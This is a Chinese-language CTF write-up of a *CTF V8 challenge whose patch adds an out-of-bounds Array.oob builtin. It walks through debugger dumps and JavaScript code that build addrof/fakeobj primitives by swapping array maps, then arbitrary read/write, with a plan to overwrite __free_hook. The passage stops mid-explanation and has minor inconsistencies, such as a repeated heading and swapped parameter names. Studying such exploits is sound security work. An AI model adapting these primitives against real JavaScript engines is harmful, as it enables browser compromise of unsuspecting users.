**作者：V1NKe**  
**来源：**
## 前言：
之前参加*CTF看到出了一道v8的题，之前就对v8感兴趣，拖了很久才把这题给弄清楚。不过这题出题人在原基础上自己写了漏洞的代码，算是相对较简单的一道题，算是作为v8初识的一道题。
## 正文：
拿到一个`diff`：
    diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
    index b027d36..ef1002f 100644
    --- a/src/bootstrapper.cc
    +++ b/src/bootstrapper.cc
    @@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle global_object,
                               Builtins::kArrayPrototypeCopyWithin, 2, false);
         SimpleInstallFunction(isolate_, proto, "fill",
                               Builtins::kArrayPrototypeFill, 1, false);
    +    SimpleInstallFunction(isolate_, proto, "oob",
    +                          Builtins::kArrayOob,2,false);
         SimpleInstallFunction(isolate_, proto, "find",
                               Builtins::kArrayPrototypeFind, 1, false);
         SimpleInstallFunction(isolate_, proto, "findIndex",
    diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
    index 8df340e..9b828ab 100644
    --- a/src/builtins/builtins-array.cc
    +++ b/src/builtins/builtins-array.cc
    @@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
       return *final_length;
     }
     }  // namespace
    +BUILTIN(ArrayOob){
    +    uint32_t len = args.length();
    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    +    Handle receiver;
    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +    Handle array = Handle::cast(receiver);
    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +    uint32_t length = static_cast(array->length()->Number());
    +    if(len == 1){
    +        //read
    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    +    }else{
    +        //write
    +        Handle value;
    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +                isolate, value, Object::ToNumber(isolate, args.at(1)));
    +        elements.set(length,value->Number());
    +        return ReadOnlyRoots(isolate).undefined_value();
    +    }
    +}
     BUILTIN(ArrayPush) {
       HandleScope scope(isolate);
    diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
    index 0447230..f113a81 100644
    --- a/src/builtins/builtins-definitions.h
    +++ b/src/builtins/builtins-definitions.h
    @@ -368,6 +368,7 @@ namespace internal {
       TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
       /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
       TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
    +  CPP(ArrayOob)                                                                \
                                                                                    \
       /* ArrayBuffer */                                                            \
       /* ES #sec-arraybuffer-constructor */                                        \
    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
    index ed1e4a5..c199e3a 100644
    --- a/src/compiler/typer.cc
    +++ b/src/compiler/typer.cc
    @@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
           return Type::Receiver();
         case Builtins::kArrayUnshift:
           return t->cache_->kPositiveSafeInteger;
    +    case Builtins::kArrayOob:
    +      return Type::Receiver();
         // ArrayBuffer functions.
         case Builtins::kArrayBufferIsView:
看新加的`oob`函数就行（虽然我也看不太懂写的是个啥玩楞2333。里面的`read`和`write`注释，还有直接取了`length`可以大概意识到是一个越界读写的漏洞。
`a.oob()`就是将越界的首个8字节给读出，`a.oob(1)`就是将`1`写入越界的首个8字节。
那么越界读写就好办了，先测试一下看看：
    ?  x64.release git:(6dc88c1) ? ./d8 
    V8 version 7.5.0 (candidate)
    d8> a = [1,2,3,4]
    [1, 2, 3, 4]
    d8> a.oob()    
    4.42876206109e-311
因为v8中的数以浮点数的形式显示，所以先写好浮点数与整数间的转化原语函数：
    var buff_area = new ArrayBuffer(0x10);
    var fl = new Float64Array(buff_area);
    var ui = new BigUint64Array(buff_area);
    function ftoi(floo){
        fl[0] = floo;
        return ui[0];
    }
    function itof(intt){
        ui[0] = intt;
        return fl[0];
    }
    function tos(data){
        return "0x"+data.toString(16);
    }
上手调试，先看看一个数组的排布情况：
    var a = [0x1000000,2,3,4];
    pwndbg> x/10xg 0x101d1f8d0069-1
    0x101d1f8d0068: 0x00000a9abe942d99  0x000012a265ac0c71   --> JSArray
    0x101d1f8d0078: 0x0000101d1f8cf079  0x0000000400000000
    0x101d1f8d0088: 0x0000000000000000  0x0000000000000000
    0x101d1f8d0098: 0x0000000000000000  0x0000000000000000
    0x101d1f8d00a8: 0x0000000000000000  0x0000000000000000
    pwndbg> x/10xg 0x0000101d1f8cf079-1
    0x101d1f8cf078: 0x000012a265ac0851  0x0000000400000000   --> FixedArray
    0x101d1f8cf088: 0x0100000000000000  0x0000000200000000
    0x101d1f8cf098: 0x0000000300000000  0x0000000400000000
    0x101d1f8cf0a8: 0x000012a265ac0851  0x0000005c00000000
    0x101d1f8cf0b8: 0x0000000000000000  0x0000006100000000
所以此时的`a.oob()`所泄漏的应该是`0x000012a265ac0851`的double形式。但是我们无法知道`0x000012a265ac0851`是什么内容，不可控。那么我们换一个数组，看以下数组情况：
    var a = [1.1,2.2,3.3,4.4];
    pwndbg> x/10xg 0x0797a34100c9-1
    0x797a34100c8:  0x00001c07e15c2ed9  0x00000df4ef880c71   --> JSArray
    0x797a34100d8:  0x00000797a3410099  0x0000000400000000
    0x797a34100e8:  0x0000000000000000  0x0000000000000000
    0x797a34100f8:  0x0000000000000000  0x0000000000000000
    0x797a3410108:  0x0000000000000000  0x0000000000000000
    pwndbg> x/10xg 0x00000797a3410099-1
    0x797a3410098:  0x00000df4ef8814f9  0x0000000400000000   --> FixedArray
    0x797a34100a8:  0x3ff199999999999a  0x400199999999999a
    0x797a34100b8:  0x400a666666666666  0x401199999999999a
    0x797a34100c8:  0x00001c07e15c2ed9  0x00000df4ef880c71   --> JSArray
    0x797a34100d8:  0x00000797a3410099  0x0000000400000000
我们可以看见`FixedArray`和`JSArray`是紧邻的，所以`a.oob()`泄漏的是`0x00001c07e15c2ed9`，即`JSArray`的`map`值（`PACKED_DOUBLE_ELEMENTS`）。这样我们就好构造利用了。
### 类型混淆：
假设我们有一个浮点型的数组和一个对象数组，我们先用上面所说的`a.oob()`泄漏各自的`map`值，在用我们的可写功能，将浮点型数组的`map`写入对象数组的`map`，这样对象数组中所存储的对象地址就被当作了浮点值，因此我们可以泄漏任意对象的地址。
相同的，将对象数组的`map`写入浮点型数组的`map`，那么浮点型数组中所存储的浮点值就会被当作对象地址来看待，所以我们可以构造任意地址的对象。
### 泄漏对象地址和构造地址对象：
先得到两个类型的`map`：
    var obj = {"A":0x100};
    var obj_all = [obj];
    var array_all = [1.1,2,3];
    var obj_map = obj_all.oob();       //obj_JSArray_map
    var float_array_map = array_all.oob();   //float_JSArray_map
再写出泄漏和构造的两个函数：
    function leak_obj(obj_in){                //泄漏对象地址
        obj_all[0] = obj_in;
        obj_all.oob(float_array_map);
        let leak_obj_addr = obj_all[0];
        obj_all.oob(obj_map);
        return ftoi(leak_obj_addr);
    }
    function fake_obj(obj_in){                //构造地址对象
        array_all[0] = itof(obj_in);
        array_all.oob(obj_map);
        let fake_obj_addr = array_all[0];
        array_all.oob(float_array_map);
        return fake_obj_addr;
    }
得到了以上的泄漏和构造之后我们想办法将利用链扩大，构造出任意读写的功能。
### 任意写：
先构造一个浮点型数组：
    var test = [7.7,1.1,1,0xfffffff];
再泄漏该数组地址：
    leak_obj(test);
这样我们可以得到数组的内存地址，此时数组中的情况：
    pwndbg> x/20xg 0x2d767fbd0019-1-0x30
    0x2d767fbcffe8: 0x000030a6f3b014f9  0x0000000400000000   --> FixedArray
    0x2d767fbcfff8: 0x00003207dce82ed9  0x3ff199999999999a
    0x2d767fbd0008: 0x3ff0000000000000  0x41affffffe000000
    0x2d767fbd0018: 0x00003207dce82ed9  0x000030a6f3b00c71   --> JSArray
    0x2d767fbd0028: 0x00002d767fbcffe9  0x0000000400000000
我们可以利用构造地址对象把`0x2d767fbcfff8`处伪造为一个`JSArray`对象，我们将`test[0]`写为浮点型数组的`map`即可。这样，`0x2d767fbcfff8-0x2d767fbd0018`的32字节就是`JSArray`，我们再在`0x2d767fbd0008`任意写一个地址，我们就能达到任意写的目的。比如我们将他写为`0x2d767fbcffc8`，那么`0x2d767fbcffc8`处就是伪造的`FixedArray`，`0x2d767fbcffc8+0x10`处就为`elements`的内容，把伪造的对象记为`fake_js`，那么执行：
    fake_js[0] = 0x100;
即把0x100复制给`0x2d767fbcffc8+0x10`处。
### 任意写：
任意写就很简单了，就是：
    console.log(fake_js[0]);
取出数组内容即可。
那么接下来写构造出来的任意读写函数：
    function write_all(read_addr,read_data){
        let test_read = fake_obj(leak_obj(tt)-0x20n);
        tt[2] = itof(read_addr-0x10n);
        test_read[0] = itof(read_data);
    }
    function read_all(write_addr){
        let test_write = fake_obj(leak_obj(tt)-0x20n);
        tt[2] = itof(write_addr-0x10n);
        return ftoi(test_write[0]);
    }
有了任意读写之后就好利用了，可以用`pwn`中的常规思路来后续利用：
  1. 泄漏libc基址
  2. 覆写`__free_hook`
  3. 触发`__free_hook`
后续在覆写`__free_hook`的过程中，会发现覆写不成功（说是浮点数组处理`7f`高地址的时候会有变换。
所以这里需要改写一下任意写，这里我们就需要利用`ArrayBuffer`的`backing_store`去利用任意写：
先新建一块写区域：
    var buff_new = new ArrayBuffer(0x20);
    var dataview = new DataView(buff_new);
    %DebugPrint(buff_new);
这时候写入：
    dataview.setBigUint64(0,0x12345678,true);
在`ArrayBuffer`中的`backing_store`字段中会发现：
    pwndbg> x/10xg 0x029ce8f500a9-1
    0x29ce8f500a8:  0x00002f1fa5c821b9  0x00002cb659b80c71
    0x29ce8f500b8:  0x00002cb659b80c71  0x0000000000000020
    0x29ce8f500c8:  0x000055555639fe70  --> backing_store  0x0000000000000002
    0x29ce8f500d8:  0x0000000000000000  0x0000000000000000
    0x29ce8f500e8:  0x00002f1fa5c81719  0x00002cb659b80c71
    pwndbg> x/10xg 0x000055555639fe70
    0x55555639fe70: 0x0000000012345678  0x0000000000000000
    0x55555639fe80: 0x0000000000000000  0x0000000000000000
    0x55555639fe90: 0x0000000000000000  0x0000000000000041
    0x55555639fea0: 0x000055555639fe10  0x000000539d1ea015
    0x55555639feb0: 0x0000029ce8f500a9  0x000055555639fe70
因此，只要我们先将`backing_store`改写为我们所想要写的地址，再利用dataview的写入功能即可完成任意写：